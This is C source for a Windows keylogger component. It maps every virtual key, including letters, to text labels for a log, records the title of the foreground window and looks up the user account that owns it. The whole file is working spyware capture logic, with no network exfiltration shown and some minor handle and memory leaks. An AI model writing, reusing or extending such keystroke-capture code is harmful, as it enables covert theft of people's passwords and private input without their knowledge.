#include "winkey.h"

extern BOOL foregroundWindowChanged;
extern char foregroundWindowTitle[4096];

/**
 * This function prints text representation of a virtual key, according to a mode.
 * If the mode is 0, it prints vKey like Ctrl, Alt etc. without printing vKey representation
 * of printable vkey (ie "A", "*" and so on).
 * 
 * If the mode is 1, it also prints the printable characters, normally because a sequence initiated by a [CTRL] vkey
 * or an ALT vkey was began.
 * 
 * Thanks to this, we can log [CTRL]+[S] instead of [CTRL] and nothing, or a strange char code outputed by
 * the infamous UnicodeEx function.
 */
VOID LogvKey(INT vKey, INT MODE)
{
    if (MODE == 0)
    {
        switch(vKey) {
            case VK_LBUTTON:
                log("[Left mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_RBUTTON:
                log("[Right mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_CANCEL:
                log("[Control-break processing]", CHAR_MODE, FALSE);
                break;
            case VK_MBUTTON:
                log("[Middle mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_XBUTTON1:
                log("[X1 mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_XBUTTON2:
                log("[X2 mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_BACK:
                log("[Backspace]", CHAR_MODE, FALSE);
                break;
            case VK_TAB:
                log("\\t", CHAR_MODE, FALSE);
                break;
            case VK_CLEAR:
                log("[Clear]", CHAR_MODE, FALSE);
                break;
            case VK_RETURN:
                log("\\n", CHAR_MODE, FALSE);
                break;
            case VK_SHIFT:
                log("[Shift]", CHAR_MODE, FALSE);
                break;
            case VK_CONTROL:
                log("[Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_MENU:
                log("[Alt]", CHAR_MODE, FALSE);
                break;
            case VK_PAUSE:
                log("[Pause]", CHAR_MODE, FALSE);
                break;
            case VK_CAPITAL:
                log("[Caps lock]", CHAR_MODE, FALSE);
                break;
            case VK_HANGUL:
                log("[IME Kana/Hangul mode]", CHAR_MODE, FALSE);
                break;
            case VK_IME_ON:
                log("[IME On]", CHAR_MODE, FALSE);
                break;
            case VK_JUNJA:
                log("[IME Junja mode]", CHAR_MODE, FALSE);
                break;
            case VK_FINAL:
                log("[IME final mode]", CHAR_MODE, FALSE);
                break;
            case VK_KANJI:
                log("[IME Kanji/Hanja mode]", CHAR_MODE, FALSE);
                break;
            case VK_IME_OFF:
                log("[IME Off]", CHAR_MODE, FALSE);
                break;
            case VK_ESCAPE:
                log("[Esc]", CHAR_MODE, FALSE);
                break;
            case VK_CONVERT:
                log("[IME convert]", CHAR_MODE, FALSE);
                break;
            case VK_NONCONVERT:
                log("[IME nonconvert]", CHAR_MODE, FALSE);
                break;
            case VK_ACCEPT:
                log("[IME accept]", CHAR_MODE, FALSE);
                break;
            case VK_MODECHANGE:
                log("[IME mode change request]", CHAR_MODE, FALSE);
                break;
            case VK_PRIOR:
                log("[Page up]", CHAR_MODE, FALSE);
                break;
            case VK_NEXT:
                log("[Page down]", CHAR_MODE, FALSE);
                break;
            case VK_END:
                log("[End]", CHAR_MODE, FALSE);
                break;
            case VK_HOME:
                log("[Home]", CHAR_MODE, FALSE);
                break;
            case VK_LEFT:
                log("[Left arrow]", CHAR_MODE, FALSE);
                break;
            case VK_UP:
                log("[Up arrow]", CHAR_MODE, FALSE);
                break;
            case VK_RIGHT:
                log("[Right arrow]", CHAR_MODE, FALSE);
                break;
            case VK_DOWN:
                log("[Down arrow]", CHAR_MODE, FALSE);
                break;
            case VK_SELECT:
                log("[Select]", CHAR_MODE, FALSE);
                break;
            case VK_PRINT:
                log("[Print]", CHAR_MODE, FALSE);
                break;
            case VK_EXECUTE:
                log("[Execute]", CHAR_MODE, FALSE);
                break;
            case VK_SNAPSHOT:
                log("[Print screen]", CHAR_MODE, FALSE);
                break;
            case VK_INSERT:
                log("[Insert]", CHAR_MODE, FALSE);
                break;
            case VK_DELETE:
                log("[Delete]", CHAR_MODE, FALSE);
                break;
            case VK_HELP:
                log("[Help]", CHAR_MODE, FALSE);
                break;
            case VK_LWIN:
                log("[Left Windows logo]", CHAR_MODE, FALSE);
                break;
            case VK_RWIN:
                log("[Right Windows logo]", CHAR_MODE, FALSE);
                break;
            case VK_APPS:
                log("[Application]", CHAR_MODE, FALSE);
                break;
            case VK_SLEEP:
                log("[Computer Sleep]", CHAR_MODE, FALSE);
                break;
            case VK_DIVIDE:
                log("[Divide]", CHAR_MODE, FALSE);
                break;
            case VK_F1:
                log("[F1]", CHAR_MODE, FALSE);
                break;
            case VK_F2:
                log("[F2]", CHAR_MODE, FALSE);
                break;
            case VK_F3:
                log("[F3]", CHAR_MODE, FALSE);
                break;
            case VK_F4:
                log("[F4]", CHAR_MODE, FALSE);
                break;
            case VK_F5:
                log("[F5]", CHAR_MODE, FALSE);
                break;
            case VK_F6:
                log("[F6]", CHAR_MODE, FALSE);
                break;
            case VK_F7:
                log("[F7]", CHAR_MODE, FALSE);
                break;
            case VK_F8:
                log("[F8]", CHAR_MODE, FALSE);
                break;
            case VK_F9:
                log("[F9]", CHAR_MODE, FALSE);
                break;
            case VK_F10:
                log("[F10]", CHAR_MODE, FALSE);
                break;
            case VK_F11:
                log("[F11]", CHAR_MODE, FALSE);
                break;
            case VK_F12:
                log("[F12]", CHAR_MODE, FALSE);
                break;
            case VK_F13:
                log("[F13]", CHAR_MODE, FALSE);
                break;
            case VK_F14:
                log("[F14]", CHAR_MODE, FALSE);
                break;
            case VK_F15:
                log("[F15]", CHAR_MODE, FALSE);
                break;
            case VK_F16:
                log("[F16]", CHAR_MODE, FALSE);
                break;
            case VK_F17:
                log("[F17]", CHAR_MODE, FALSE);
                break;
            case VK_F18:
                log("[F18]", CHAR_MODE, FALSE);
                break;
            case VK_F19:
                log("[F19]", CHAR_MODE, FALSE);
                break;
            case VK_F20:
                log("[F20]", CHAR_MODE, FALSE);
                break;
            case VK_F21:
                log("[F21]", CHAR_MODE, FALSE);
                break;
            case VK_F22:
                log("[F22]", CHAR_MODE, FALSE);
                break;
            case VK_F23:
                log("[F23]", CHAR_MODE, FALSE);
                break;
            case VK_F24:
                log("[F24]", CHAR_MODE, FALSE);
                break;
            case VK_NUMLOCK:
                log("[Num lock]", CHAR_MODE, FALSE);
                break;
            case VK_SCROLL:
                log("[Scroll lock]", CHAR_MODE, FALSE);
                break;
            case VK_LSHIFT:
                log("[Left Shift]", CHAR_MODE, FALSE);
                break;
            case VK_RSHIFT:
                log("[Right Shift]", CHAR_MODE, FALSE);
                break;
            case VK_LCONTROL:
                log("[Left Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_RCONTROL:
                log("[Right Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_LMENU:
                log("[Left Alt]", CHAR_MODE, FALSE);
                break;
            case VK_RMENU:
                log("[Right Alt]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_BACK:
                log("[Browser Back]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_FORWARD:
                log("[Browser Forward]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_REFRESH:
                log("[Browser Refresh]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_STOP:
                log("[Browser Stop]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_SEARCH:
                log("[Browser Search]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_FAVORITES:
                log("[Browser Favorites]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_HOME:
                log("[Browser Start and Home]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_MUTE:
                log("[Volume Mute]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_DOWN:
                log("[Volume Down]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_UP:
                log("[Volume Up]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_NEXT_TRACK:
                log("[Next Track]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_PREV_TRACK:
                log("[Previous Track]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_STOP:
                log("[Stop Media]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_PLAY_PAUSE:
                log("[Play/Pause Media]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_MAIL:
                log("[Start Mail]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_MEDIA_SELECT:
                log("[Select Media]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_APP1:
                log("[Start Application 1]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_APP2:
                log("[Start Application 2]", CHAR_MODE, FALSE);
                break;
            case VK_PROCESSKEY:
                log("[IME PROCESS]", CHAR_MODE, FALSE);
                break;
            case VK_PACKET:
                log("[Unicode characters]", CHAR_MODE, FALSE);
                break;
            case VK_ATTN:
                log("[Attn]", CHAR_MODE, FALSE);
                break;
            case VK_CRSEL:
                log("[CrSel]", CHAR_MODE, FALSE);
                break;
            case VK_EXSEL:
                log("[ExSel]", CHAR_MODE, FALSE);
                break;
            case VK_EREOF:
                log("[Erase EOF]", CHAR_MODE, FALSE);
                break;
            case VK_PLAY:
                log("[Play]", CHAR_MODE, FALSE);
                break;
            case VK_ZOOM:
                log("[Zoom]", CHAR_MODE, FALSE);
                break;
            case VK_NONAME:
                log("[Reserved]", CHAR_MODE, FALSE);
                break;
            case VK_PA1:
                log("[PA1]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_CLEAR:
                log("[Clear]", CHAR_MODE, FALSE);
                break;
            default:
                break;
        }
    }
    else
    {
        switch(vKey) {
            case VK_LBUTTON:
                log("[Left mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_RBUTTON:
                log("[Right mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_CANCEL:
                log("[Control-break processing]", CHAR_MODE, FALSE);
                break;
            case VK_MBUTTON:
                log("[Middle mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_XBUTTON1:
                log("[X1 mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_XBUTTON2:
                log("[X2 mouse button]", CHAR_MODE, FALSE);
                break;
            case VK_BACK:
                log("[Backspace]", CHAR_MODE, FALSE);
                break;
            case VK_TAB:
                log("\\t", CHAR_MODE, FALSE);
                break;
            case VK_CLEAR:
                log("[Clear]", CHAR_MODE, FALSE);
                break;
            case VK_RETURN:
                log("\\n", CHAR_MODE, FALSE);
                break;
            case VK_SHIFT:
                log("[Shift]", CHAR_MODE, FALSE);
                break;
            case VK_CONTROL:
                log("[Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_MENU:
                log("[Alt]", CHAR_MODE, FALSE);
                break;
            case VK_PAUSE:
                log("[Pause]", CHAR_MODE, FALSE);
                break;
            case VK_CAPITAL:
                log("[Caps lock]", CHAR_MODE, FALSE);
                break;
            case VK_HANGUL:
                log("[IME Kana/Hangul mode]", CHAR_MODE, FALSE);
                break;
            case VK_IME_ON:
                log("[IME On]", CHAR_MODE, FALSE);
                break;
            case VK_JUNJA:
                log("[IME Junja mode]", CHAR_MODE, FALSE);
                break;
            case VK_FINAL:
                log("[IME final mode]", CHAR_MODE, FALSE);
                break;
            case VK_KANJI:
                log("[IME Kanji/Hanja mode]", CHAR_MODE, FALSE);
                break;
            case VK_IME_OFF:
                log("[IME Off]", CHAR_MODE, FALSE);
                break;
            case VK_ESCAPE:
                log("[Esc]", CHAR_MODE, FALSE);
                break;
            case VK_CONVERT:
                log("[IME convert]", CHAR_MODE, FALSE);
                break;
            case VK_NONCONVERT:
                log("[IME nonconvert]", CHAR_MODE, FALSE);
                break;
            case VK_ACCEPT:
                log("[IME accept]", CHAR_MODE, FALSE);
                break;
            case VK_MODECHANGE:
                log("[IME mode change request]", CHAR_MODE, FALSE);
                break;
            case VK_SPACE:
                log("[Spacebar]", CHAR_MODE, FALSE);
                break;
            case VK_PRIOR:
                log("[Page up]", CHAR_MODE, FALSE);
                break;
            case VK_NEXT:
                log("[Page down]", CHAR_MODE, FALSE);
                break;
            case VK_END:
                log("[End]", CHAR_MODE, FALSE);
                break;
            case VK_HOME:
                log("[Home]", CHAR_MODE, FALSE);
                break;
            case VK_LEFT:
                log("[Left arrow]", CHAR_MODE, FALSE);
                break;
            case VK_UP:
                log("[Up arrow]", CHAR_MODE, FALSE);
                break;
            case VK_RIGHT:
                log("[Right arrow]", CHAR_MODE, FALSE);
                break;
            case VK_DOWN:
                log("[Down arrow]", CHAR_MODE, FALSE);
                break;
            case VK_SELECT:
                log("[Select]", CHAR_MODE, FALSE);
                break;
            case VK_PRINT:
                log("[Print]", CHAR_MODE, FALSE);
                break;
            case VK_EXECUTE:
                log("[Execute]", CHAR_MODE, FALSE);
                break;
            case VK_SNAPSHOT:
                log("[Print screen]", CHAR_MODE, FALSE);
                break;
            case VK_INSERT:
                log("[Insert]", CHAR_MODE, FALSE);
                break;
            case VK_DELETE:
                log("[Delete]", CHAR_MODE, FALSE);
                break;
            case VK_HELP:
                log("[Help]", CHAR_MODE, FALSE);
                break;
            case VK_LWIN:
                log("[Left Windows logo]", CHAR_MODE, FALSE);
                break;
            case VK_RWIN:
                log("[Right Windows logo]", CHAR_MODE, FALSE);
                break;
            case VK_APPS:
                log("[Application]", CHAR_MODE, FALSE);
                break;
            case VK_SLEEP:
                log("[Computer Sleep]", CHAR_MODE, FALSE);
                break;
                case 'A':
                log("[A]", CHAR_MODE, FALSE);
                break;
            case 'B':
                log("[B]", CHAR_MODE, FALSE);
                break;
            case 'C':
                log("[C]", CHAR_MODE, FALSE);
                break;
            case 'D':
                log("[D]", CHAR_MODE, FALSE);
                break;
            case 'E':
                log("[E]", CHAR_MODE, FALSE);
                break;
            case 'F':
                log("[F]", CHAR_MODE, FALSE);
                break;
            case 'G':
                log("[G]", CHAR_MODE, FALSE);
                break;
            case 'H':
                log("[H]", CHAR_MODE, FALSE);
                break;
            case 'I':
                log("[I]", CHAR_MODE, FALSE);
                break;
            case 'J':
                log("[J]", CHAR_MODE, FALSE);
                break;
            case 'K':
                log("[K]", CHAR_MODE, FALSE);
                break;
            case 'L':
                log("[L]", CHAR_MODE, FALSE);
                break;
            case 'M':
                log("[M]", CHAR_MODE, FALSE);
                break;
            case 'N':
                log("[N]", CHAR_MODE, FALSE);
                break;
            case 'O':
                log("[O]", CHAR_MODE, FALSE);
                break;
            case 'P':
                log("[P]", CHAR_MODE, FALSE);
                break;
            case 'Q':
                log("[Q]", CHAR_MODE, FALSE);
                break;
            case 'R':
                log("[R]", CHAR_MODE, FALSE);
                break;
            case 'S':
                log("[S]", CHAR_MODE, FALSE);
                break;
            case 'T':
                log("[T]", CHAR_MODE, FALSE);
                break;
            case 'U':
                log("[U]", CHAR_MODE, FALSE);
                break;
            case 'V':
                log("[V]", CHAR_MODE, FALSE);
                break;
            case 'W':
                log("[W]", CHAR_MODE, FALSE);
                break;
            case 'X':
                log("[X]", CHAR_MODE, FALSE);
                break;
            case 'Y':
                log("[Y]", CHAR_MODE, FALSE);
                break;
            case 'Z':
                log("[Z]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD0:
                log("[Numeric keypad 0]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD1:
                log("[Numeric keypad 1]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD2:
                log("[Numeric keypad 2]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD3:
                log("[Numeric keypad 3]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD4:
                log("[Numeric keypad 4]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD5:
                log("[Numeric keypad 5]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD6:
                log("[Numeric keypad 6]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD7:
                log("[Numeric keypad 7]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD8:
                log("[Numeric keypad 8]", CHAR_MODE, FALSE);
                break;
            case VK_NUMPAD9:
                log("[Numeric keypad 9]", CHAR_MODE, FALSE);
                break;
            case VK_MULTIPLY:
                log("[Multiply]", CHAR_MODE, FALSE);
                break;
            case VK_ADD:
                log("[Add]", CHAR_MODE, FALSE);
                break;
            case VK_SEPARATOR:
                log("[Separator]", CHAR_MODE, FALSE);
                break;
            case VK_SUBTRACT:
                log("[Subtract]", CHAR_MODE, FALSE);
                break;
            case VK_DECIMAL:
                log("[Decimal]", CHAR_MODE, FALSE);
                break;
            case VK_DIVIDE:
                log("[Divide]", CHAR_MODE, FALSE);
                break;
            case VK_F1:
                log("[F1]", CHAR_MODE, FALSE);
                break;
            case VK_F2:
                log("[F2]", CHAR_MODE, FALSE);
                break;
            case VK_F3:
                log("[F3]", CHAR_MODE, FALSE);
                break;
            case VK_F4:
                log("[F4]", CHAR_MODE, FALSE);
                break;
            case VK_F5:
                log("[F5]", CHAR_MODE, FALSE);
                break;
            case VK_F6:
                log("[F6]", CHAR_MODE, FALSE);
                break;
            case VK_F7:
                log("[F7]", CHAR_MODE, FALSE);
                break;
            case VK_F8:
                log("[F8]", CHAR_MODE, FALSE);
                break;
            case VK_F9:
                log("[F9]", CHAR_MODE, FALSE);
                break;
            case VK_F10:
                log("[F10]", CHAR_MODE, FALSE);
                break;
            case VK_F11:
                log("[F11]", CHAR_MODE, FALSE);
                break;
            case VK_F12:
                log("[F12]", CHAR_MODE, FALSE);
                break;
            case VK_F13:
                log("[F13]", CHAR_MODE, FALSE);
                break;
            case VK_F14:
                log("[F14]", CHAR_MODE, FALSE);
                break;
            case VK_F15:
                log("[F15]", CHAR_MODE, FALSE);
                break;
            case VK_F16:
                log("[F16]", CHAR_MODE, FALSE);
                break;
            case VK_F17:
                log("[F17]", CHAR_MODE, FALSE);
                break;
            case VK_F18:
                log("[F18]", CHAR_MODE, FALSE);
                break;
            case VK_F19:
                log("[F19]", CHAR_MODE, FALSE);
                break;
            case VK_F20:
                log("[F20]", CHAR_MODE, FALSE);
                break;
            case VK_F21:
                log("[F21]", CHAR_MODE, FALSE);
                break;
            case VK_F22:
                log("[F22]", CHAR_MODE, FALSE);
                break;
            case VK_F23:
                log("[F23]", CHAR_MODE, FALSE);
                break;
            case VK_F24:
                log("[F24]", CHAR_MODE, FALSE);
                break;
            case VK_NUMLOCK:
                log("[Num lock]", CHAR_MODE, FALSE);
                break;
            case VK_SCROLL:
                log("[Scroll lock]", CHAR_MODE, FALSE);
                break;
            case VK_LSHIFT:
                log("[Left Shift]", CHAR_MODE, FALSE);
                break;
            case VK_RSHIFT:
                log("[Right Shift]", CHAR_MODE, FALSE);
                break;
            case VK_LCONTROL:
                log("[Left Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_RCONTROL:
                log("[Right Ctrl]", CHAR_MODE, FALSE);
                break;
            case VK_LMENU:
                log("[Left Alt]", CHAR_MODE, FALSE);
                break;
            case VK_RMENU:
                log("[Right Alt]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_BACK:
                log("[Browser Back]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_FORWARD:
                log("[Browser Forward]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_REFRESH:
                log("[Browser Refresh]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_STOP:
                log("[Browser Stop]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_SEARCH:
                log("[Browser Search]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_FAVORITES:
                log("[Browser Favorites]", CHAR_MODE, FALSE);
                break;
            case VK_BROWSER_HOME:
                log("[Browser Start and Home]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_MUTE:
                log("[Volume Mute]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_DOWN:
                log("[Volume Down]", CHAR_MODE, FALSE);
                break;
            case VK_VOLUME_UP:
                log("[Volume Up]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_NEXT_TRACK:
                log("[Next Track]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_PREV_TRACK:
                log("[Previous Track]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_STOP:
                log("[Stop Media]", CHAR_MODE, FALSE);
                break;
            case VK_MEDIA_PLAY_PAUSE:
                log("[Play/Pause Media]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_MAIL:
                log("[Start Mail]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_MEDIA_SELECT:
                log("[Select Media]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_APP1:
                log("[Start Application 1]", CHAR_MODE, FALSE);
                break;
            case VK_LAUNCH_APP2:
                log("[Start Application 2]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_1:
                log("[;:]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_PLUS:
                log("[+]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_COMMA:
                log("[,]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_MINUS:
                log("[-]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_PERIOD:
                log("[.]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_2:
                log("[/?]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_3:
                log("[`~]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_4:
                log("[[{]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_5:
                log("[\\|]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_6:
                log("[]}]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_7:
                log("['\"]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_8:
                log("[miscellaneous characters]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_102:
                log("[<> keys]", CHAR_MODE, FALSE);
                break;
            case VK_PROCESSKEY:
                log("[IME PROCESS]", CHAR_MODE, FALSE);
                break;
            case VK_PACKET:
                log("[Unicode characters]", CHAR_MODE, FALSE);
                break;
            case VK_ATTN:
                log("[Attn]", CHAR_MODE, FALSE);
                break;
            case VK_CRSEL:
                log("[CrSel]", CHAR_MODE, FALSE);
                break;
            case VK_EXSEL:
                log("[ExSel]", CHAR_MODE, FALSE);
                break;
            case VK_EREOF:
                log("[Erase EOF]", CHAR_MODE, FALSE);
                break;
            case VK_PLAY:
                log("[Play]", CHAR_MODE, FALSE);
                break;
            case VK_ZOOM:
                log("[Zoom]", CHAR_MODE, FALSE);
                break;
            case VK_NONAME:
                log("[Reserved]", CHAR_MODE, FALSE);
                break;
            case VK_PA1:
                log("[PA1]", CHAR_MODE, FALSE);
                break;
            case VK_OEM_CLEAR:
                log("[Clear]", CHAR_MODE, FALSE);
                break;
            default:
                break;
        }
    }

}

VOID GetUsernameOfForegroundWindow(LPSTR username, DWORD foregroundWindowPID)
{
    HANDLE foregroundWindowProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, foregroundWindowPID);
    TOKEN_USER tokenUser;
    HANDLE hToken;
    DWORD dwSize;

    if (foregroundWindowProcessHandle == NULL)
        goto END;
    if (!OpenProcessToken(foregroundWindowProcessHandle, TOKEN_QUERY, &hToken))
        goto END;
    GetTokenInformation(hToken, TokenUser, &tokenUser, sizeof(tokenUser), &dwSize);
        PTOKEN_USER pTokenUser = malloc(dwSize);
    if (pTokenUser == NULL)
        goto END;
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
    {
        SID_NAME_USE sidType;
        char name[256];
        char domain[256];
        DWORD nameSize = sizeof(name);
        DWORD domainSize = sizeof(domain);
        
        if (LookupAccountSid(NULL, pTokenUser->User.Sid, name, &nameSize, domain, &domainSize, &sidType))
        {
            strncpy_s(username, 4096, domain, _TRUNCATE);//_TRUNCATE will truncate the string if dst is too small
            strncat_s(username, 4096, "\\", _TRUNCATE);
            strncat_s(username, 4096, name, _TRUNCATE);
        }
        else
        {
            REEF(pTokenUser);
            goto END;
        }
    }
    REEF(pTokenUser);
    return;
END:
    strncpy_s(username, strlen("[USERNAME LOOKUP FAILED]"), "[USERNAME LOOKUP FAILED]", _TRUNCATE);
}

VOID GetWindowTitle(HWND hwnd)
{
    if (hwnd == NULL)
    {
        strcpy_s(foregroundWindowTitle, 4096, "[GetWindowTitle Failed]");
        log(foregroundWindowTitle, CHAR_MODE, TRUE);
        return;
    }
    int windowTitleLen = GetWindowTextLength(hwnd);
    if (windowTitleLen > 4095)
        windowTitleLen = 4095;
    GetWindowTextA(hwnd, foregroundWindowTitle, windowTitleLen + 1);
    log(foregroundWindowTitle, CHAR_MODE, TRUE);
    if (!strlen(foregroundWindowTitle))
        log("[NO WINDOW]", CHAR_MODE, TRUE);
    foregroundWindowChanged = TRUE;
}